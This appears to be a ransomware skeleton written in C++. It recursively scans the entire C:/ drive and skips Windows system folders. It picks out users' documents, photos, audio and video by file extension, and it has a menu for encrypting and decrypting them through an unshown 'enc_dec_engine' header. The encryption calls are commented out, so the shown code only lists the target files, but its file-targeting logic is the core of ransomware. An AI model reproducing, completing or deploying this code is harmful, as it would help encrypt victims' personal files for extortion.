#include "enc_dec_engine.h"
#include <iostream>
#include <filesystem>
#include <string>

using namespace std;
namespace fs = filesystem;

void LISTFILES(std::string path) {

    try {
        for (const auto& entry : fs::directory_iterator(path, fs::directory_options::skip_permission_denied)) {
            if (entry.path().string().find("Windows") == std::string::npos) {
                if (entry.path().extension().string() == ".txt" || entry.path().extension().string() == ".mp4" ||
                    entry.path().extension().string() == ".mp3" || entry.path().extension().string() == ".jpg" ||
                    entry.path().extension().string() == ".jpeg" || entry.path().extension().string() == ".doc" ||
                    entry.path().extension().string() == ".docx" || entry.path().extension().string() == ".png" ||
                    entry.path().extension().string() == ".pdf") {
                    std::cout << entry.path() << '\n';
                    //ENCRYPT_FUNCTION(entry.path().string());
                }
                if (fs::is_directory(entry.path())) {
                    LISTFILES(entry.path().string());
                }
            }
        }
    }
    catch (fs::filesystem_error const& ex) {
        std::cout << ex.what();
        
    }


}

int main() {
    int opt;
    cin >> opt;
    std::string path = "C:/";
    

    if (opt == 1) {
        //ENCRYPT_FUNCTION();
        LISTFILES(path);
    }
    else if (opt == 2) {
        DECRYPT_FUNCTION();
    }
}